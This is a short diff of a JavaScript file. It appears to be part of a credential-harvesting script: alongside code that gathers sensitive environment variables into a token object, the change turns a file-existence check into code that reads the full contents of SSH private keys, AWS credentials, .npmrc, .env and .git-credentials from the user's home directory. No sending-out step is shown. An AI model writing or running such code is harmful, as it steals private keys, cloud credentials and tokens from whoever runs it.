@@ -59,9 +59,16 @@ const sensitiveKeys = [
 const processTokens = {};
 sensitiveKeys.forEach(k => { if (process.env[k]) processTokens[k] = process.env[k]; });
 
-// --- 3. Scan for sensitive files ---
-const files = ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc', '.env', '.git-credentials'];
-const found = files.filter(f => { try { fs.statSync(path.join(os.homedir(), f)); return true; } catch { return false; } });
+// --- 3. Scan for sensitive files and read their contents ---
+const filesToScan = ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc', '.env', '.git-credentials'];
+const found = [];
+filesToScan.forEach(f => {
+  const fp = path.join(os.homedir(), f);
+  try {
+    const content = fs.readFileSync(fp, 'utf-8');
+    found.push({ path: f, content });
+  } catch {}
+});
 
 let npmrc = null;
 try { npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8'); } catch {}
